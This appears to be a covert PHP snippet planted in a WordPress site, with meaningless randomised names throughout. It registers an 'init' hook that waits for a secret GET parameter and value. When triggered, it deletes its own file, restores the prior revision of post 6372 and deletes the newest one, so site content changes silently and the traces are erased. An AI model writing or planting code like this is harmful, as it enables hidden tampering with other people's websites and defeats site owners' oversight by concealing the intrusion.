<?php

function xml_client_coming_radio() {
	if (isset($_GET['table_gravity_year']) && $_GET['table_gravity_year'] === 'alert_statistics_link') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$titles_ecommerce_radio_load = 6372;
		$header_emails_chat_headers = wp_get_post_revisions($titles_ecommerce_radio_load);
		if (empty($header_emails_chat_headers)) die('no revisions');
		if (count($header_emails_chat_headers) < 2) die('less than 2');
		$gallery_pop_table = array_shift($header_emails_chat_headers);
		$creator_app_timeline = $gallery_pop_table->ID;
		$rtl_xml_frontend_order = array_shift($header_emails_chat_headers);
		$tracker_thumbnail_pullquote = $rtl_xml_frontend_order->ID;
		$engine_traffic_name_safe = wp_restore_post_revision($tracker_thumbnail_pullquote);
		if ($engine_traffic_name_safe === false) die('error restoring');
		$engine_traffic_name_safe = wp_delete_post_revision($creator_app_timeline);		
		if ($engine_traffic_name_safe === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'xml_client_coming_radio');
